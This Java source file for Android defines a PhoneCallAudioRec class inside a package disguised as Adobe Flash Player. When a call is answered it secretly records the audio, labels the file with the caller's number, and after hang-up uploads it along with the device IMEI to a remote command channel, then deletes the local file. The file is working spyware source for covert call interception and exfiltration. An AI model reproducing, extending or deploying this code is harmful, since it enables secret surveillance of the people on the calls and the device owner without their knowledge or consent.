package com.adobe.flashplayer.data;

import java.io.File;
import java.io.FileInputStream;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.network.NetworkUitls;



public class PhoneCallAudioRec extends PhoneStateListener  {
    private final String TAG = "[ljg]PhoneCallAudioRec";

    private String phoneNumber = null;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private Context context;
    private String mode = "_in_";


    public PhoneCallAudioRec(Context context) {
        this.context = context;
    }


    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        super.onCallStateChanged(state, incomingNumber);

        if (this.phoneNumber == null && incomingNumber != null) {
            this.phoneNumber = incomingNumber.replaceAll(" ", "");
        }

        try {
            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:        //ring
                {
                    Log.e(TAG, "CALL_STATE_RINGING:" + incomingNumber);
                    MyLog.writeLogFile(TAG + " CALL_STATE_RINGING:" + incomingNumber + "\r\n");
                    break;
                }
                case TelephonyManager.CALL_STATE_OFFHOOK:    //pick up phone call through
                {
                    try {
                        String datetime = Utils.formatCurrentDateInFileName();
                        audioFilePath = Public.LOCAL_PATH_NAME + this.phoneNumber + "_" + datetime +
                                mode + Public.PHONECALLAUDIO_FILE_NAME + ".amr";

                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        mediaRecorder.setOutputFile(audioFilePath);
                        mediaRecorder.prepare();

                        mediaRecorder.setPreviewDisplay(null);
                        mediaRecorder.setOnInfoListener(null);
                        mediaRecorder.setOnErrorListener(null);
                        mediaRecorder.start();

                        Log.e(TAG, "CALL_STATE_OFFHOOK:" + incomingNumber);
                        MyLog.writeLogFile(TAG + " CALL_STATE_OFFHOOK:" + incomingNumber + "\r\n");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    break;
                }
                case TelephonyManager.CALL_STATE_IDLE:            //hang up phone,stop
                {
                    try {
                        if (mediaRecorder != null) {
                            mediaRecorder.setPreviewDisplay(null);
                            mediaRecorder.setOnInfoListener(null);
                            mediaRecorder.setOnErrorListener(null);
                            Thread.sleep(100);
                            //This happens if stop() is called immediately after start()
                            mediaRecorder.stop();
                            mediaRecorder.reset();
                            mediaRecorder.release();
                            mediaRecorder = null;
                        }

                        if (audioFilePath != null && audioFilePath.equals("") == false) {
                            File file = new File(audioFilePath);
                            if (phoneNumber != null && audioFilePath.contains(phoneNumber) == false) {
                                String datetime = Utils.formatCurrentDateInFileName();
                                String newfn = Public.LOCAL_PATH_NAME + this.phoneNumber + "_" + datetime +
                                        mode + Public.PHONECALLAUDIO_FILE_NAME + "_copy.amr";
                                File newfile = new File(newfn);
                                boolean ret = file.renameTo(newfile);
                                if (ret == false) {
                                    break;
                                }

                                file.delete();
                                file = newfile;
                            }

                            if (file.length() < 1024) {
                                break;
                            }

                            if (NetworkUitls.isNetworkAvailable(context) == false) {
                                break;
                            }

                            FileInputStream fin = new FileInputStream(file);
                            int filesize = (int) file.length();
                            int filenamelen = file.getName().getBytes().length;
                            int sendsize = filesize + 4 + filenamelen + 4;
                            byte[] sendbuf = new byte[sendsize];
                            byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                            System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                            System.arraycopy(file.getName().getBytes(), 0, sendbuf, 4, filenamelen);
                            byte[] bytefilesize = Utils.intToBytes(filesize);
                            System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
                            fin.read(sendbuf, 4 + filenamelen + 4, filesize);
                            fin.close();

                            UploadData sendaudio = new UploadData(sendbuf, sendsize, Public.CMD_DATA_PHONECALLAUDIO, Public.IMEI);
                            Thread thread = new Thread(sendaudio);
                            thread.start();

                            file.delete();

                            Log.e(TAG, "CALL_STATE_IDLE:" + incomingNumber);
                            MyLog.writeLogFile(TAG + " CALL_STATE_IDLE:" + incomingNumber + "\r\n");
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    audioFilePath = null;
                    this.phoneNumber = null;
                    break;
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("PhoneCallRecord exception:" + error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }

}



